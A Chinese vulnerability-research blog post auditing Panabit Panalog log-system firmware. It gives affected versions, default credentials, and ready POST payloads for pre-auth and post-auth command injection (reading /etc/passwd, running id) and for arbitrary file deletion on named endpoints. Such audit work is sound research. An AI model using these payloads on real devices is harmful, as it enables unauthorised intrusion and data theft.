# Panabit-Panalog 日志系统固件审计
> mstir
> 来源：https://www.iotsec-zone.com/article/48

## 0x00 前言

![0.png](https://www.iotsec-zone.com/images/MdImg/ca5e0ee731b3665627128b0267158854.png)

```
影响版本: <= MARS r10p1Free 影响范围:1.2w-1.4w
访问：/cretime.txt 文件可查看版本. 
默认账密:admin|panabit
```

并且这里能下载固件源码: [https://www.panabit.com/cn/product/2021/0107/379.html](https://www.panabit.com/cn/product/2021/0107/379.html)

![1.png](https://www.iotsec-zone.com/images/MdImg/348914c01fd5d58a42bca95b82919eda.png)

下载下来 发现web目录在 \usr\logd\www\

![2.png](https://www.iotsec-zone.com/images/MdImg/7080c0164dd7dd523371610d2606548c.png)

直接开始审计
首先要挖前台的漏洞 那么需要鉴权的文件是必不可有的. 这里使用命令删除所有包含鉴权代码的文件.

```shell
rm -rf $(grep -ril 'chksession()' ./)
```

## 0x01 前台任意命令执行

### 命令执行点1

这里定位到一处命令执行.

![3.png](https://www.iotsec-zone.com/images/MdImg/aaa371ab23e70023948363c5ad7f8770.png)
![4.png](https://www.iotsec-zone.com/images/MdImg/a499a5a7eb18fb38670f157fdb15d028.png)

发现其通过Username参数传递进去 利用Exec执行命令 未做过滤 但是命令没有回显.

![5.png](https://www.iotsec-zone.com/images/MdImg/3adec85464d9196bb728a4a9bd528c2d.png)

传入参数：
```
POST /account/sy_query.php

username=|cat /etc/passwd >1.txt
```

### 命令执行点2

定位到第二处前台命令执行.

![6.png](https://www.iotsec-zone.com/images/MdImg/95a842cce21541f59b1fe7d71de50366.png)
![7.png](https://www.iotsec-zone.com/images/MdImg/eca71aaa61d498e07188ec078a98c7cb.png)

这里传递了三个参数（Get传入或Post传入都是可以的）：Token id host
只需要符合下列条件即可触发命令执行.

```php
if (empty($token) || $id < 0 || $id == "") {
	outputres("no", "ERROR: INVALID_PARAM");
	exit;
}
```

![8.png](https://www.iotsec-zone.com/images/MdImg/638c9502bfdab252c514893dd63d5dc8.png)
Payload:
```
POST /content-apply/libres_syn_delete.php

token=1&id=2&host=|cat /etc/passwd >222.txt
```

## 0x02 后台任意命令执行

### 执行点1

/ajax_ping.php

这里post传递了ipaddr函数 带入exec命令执行.

![9.png](https://www.iotsec-zone.com/images/MdImg/d8fa925ab14c08e3b4ca219638fff325.png)
Payload:
```
POST /ajax_ping.php HTTP/1.1
  
ipaddr=|id >2.txt
```
![10.png](https://www.iotsec-zone.com/images/MdImg/3e6f5a6860ef89df10af4f8a2a5b3f3b.png)

### 执行点2

/fetchfile.php
post传递了filename,nodeip,type参数可控，带入exec造成命令执行.
![11.png](https://www.iotsec-zone.com/images/MdImg/1b47b60785c414e8b0b42269e84b6b50.png)
Payload:
```
POST /fetchfile.php HTTP/1.1
  
type=downloadfile&filename=|id >5.txt
```
![12.png](https://www.iotsec-zone.com/images/MdImg/d351c77e7654d203fce158fa98e281ae.png)
## 0x03 后台任意文件删除
定位到一处删除文件操作. /deletefile.php
这里传递了filename参数 并调用unlink函数删除文件.
![13.png](https://www.iotsec-zone.com/images/MdImg/41e3e8a73dbf16fa0f26ff7a3e522297.png)
Payload:
```
POST /deletefile.php HTTP/1.1
  
filename=5.txt
```
![14.png](https://www.iotsec-zone.com/images/MdImg/9210a022114647fcefe92b275d65abf1.png)
